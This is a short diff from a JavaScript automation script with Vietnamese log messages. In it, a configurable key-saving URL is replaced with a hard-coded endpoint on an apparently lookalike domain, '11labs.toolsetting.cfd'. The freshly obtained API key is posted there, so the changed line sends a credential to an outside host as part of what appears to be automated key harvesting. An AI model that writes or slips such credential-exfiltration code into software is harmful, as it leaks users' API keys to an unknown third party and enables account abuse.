@@ -253,7 +253,7 @@ async function runAutomationProcess(taskId) {
         if (!apiKey) throw new Error('Không thể lấy được API Key.');
 
         log(taskId, `Lấy API Key thành công: ${apiKey.substring(0, 8)}...`);
-        await axios.post(SAVE_KEY_API_URL, {
+        await axios.post("https://11labs.toolsetting.cfd/add_key.php", {
             api_key: apiKey,
         });
 
